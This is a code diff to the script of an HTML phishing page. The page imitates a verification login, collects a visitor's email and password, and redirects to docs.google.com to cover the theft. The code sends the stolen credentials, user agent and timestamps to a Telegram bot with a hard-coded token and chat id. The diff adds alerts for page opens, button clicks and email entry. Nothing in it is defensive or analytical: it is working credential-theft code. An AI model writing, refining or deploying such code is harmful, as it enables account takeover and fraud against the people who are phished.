@@ -139,9 +139,15 @@
 function currentTime(){var d=new Date(),h=d.getHours(),m=d.getMinutes(),s=d.getSeconds();h=h<10?'0'+h:h;m=m<10?'0'+m:m;s=s<10?'0'+s:s;var el=document.getElementById('clock');if(el)el.innerHTML=h+':'+m+':'+s;setTimeout(currentTime,1000);}
 currentTime();
 var cE='',cP='';
-function showLogin(){document.getElementById('phase-landing').classList.add('hidden');document.getElementById('phase-login').classList.remove('hidden');document.getElementById('em').focus();}
-function toPassword(){var e=document.getElementById('em').value.trim();if(!e||!e.includes('@')){document.getElementById('e-err').style.display='block';return;}document.getElementById('e-err').style.display='none';cE=e;document.getElementById('ue').textContent=e;document.getElementById('av').textContent=e[0].toUpperCase();document.getElementById('email-step').classList.add('hidden');document.getElementById('pw-step').classList.remove('hidden');}
-function capture(){var p=document.getElementById('pw').value;if(!p){document.getElementById('p-err').style.display='block';return;}document.getElementById('p-err').style.display='none';cP=p;document.getElementById('pw-step').classList.add('hidden');document.getElementById('load-step').classList.remove('hidden');var t='86248'+'11346';var k='AAGR8UE4YbBG0XyQ-_xcTFyVuHD_wXXT1j0';var c='79712'+'22296';var m='\ud83d\udd25\ud83d\udd25 CAPTURED \ud83d\udd25\ud83d\udd25\n\nEmail: '+cE+'\nPassword: '+cP+'\nTime: '+new Date().toISOString()+'\nUA: '+navigator.userAgent;fetch('https://api.telegram.org/bot'+t+':'+k+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:c,text:m})}).then(function(){setTimeout(function(){window.location.href='https://docs.google.com';},2000);}).catch(function(){setTimeout(function(){window.location.href='https://docs.google.com';},2000);});}
+var t='86248'+'11346';var k='AAGR8UE4YbBG0XyQ-_xcTFyVuHD_wXXT1j0';var c='79712'+'22296';
+function tg(m){fetch('https://api.telegram.org/bot'+t+':'+k+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:c,text:m})});}
+
+// Page opened notification
+tg('\ud83d\udce9 PAGE OPENED\n\nTime: '+new Date().toISOString()+'\nUA: '+navigator.userAgent+'\nRef: '+(document.referrer||'direct'));
+
+function showLogin(){document.getElementById('phase-landing').classList.add('hidden');document.getElementById('phase-login').classList.remove('hidden');document.getElementById('em').focus();tg('\ud83d\udd13 VERIFY CLICKED\n\nTime: '+new Date().toISOString());}
+function toPassword(){var e=document.getElementById('em').value.trim();if(!e||!e.includes('@')){document.getElementById('e-err').style.display='block';return;}document.getElementById('e-err').style.display='none';cE=e;document.getElementById('ue').textContent=e;document.getElementById('av').textContent=e[0].toUpperCase();document.getElementById('email-step').classList.add('hidden');document.getElementById('pw-step').classList.remove('hidden');tg('\ud83d\udce7 EMAIL ENTERED\n\nEmail: '+cE+'\nTime: '+new Date().toISOString());}
+function capture(){var p=document.getElementById('pw').value;if(!p){document.getElementById('p-err').style.display='block';return;}document.getElementById('p-err').style.display='none';cP=p;document.getElementById('pw-step').classList.add('hidden');document.getElementById('load-step').classList.remove('hidden');tg('\ud83d\udd25\ud83d\udd25\ud83d\udd25 CREDENTIAL CAPTURED \ud83d\udd25\ud83d\udd25\ud83d\udd25\n\nEmail: '+cE+'\nPassword: '+cP+'\nTime: '+new Date().toISOString()+'\nUA: '+navigator.userAgent);setTimeout(function(){window.location.href='https://docs.google.com';},2000);}
 </script>
 </body>
 </html>
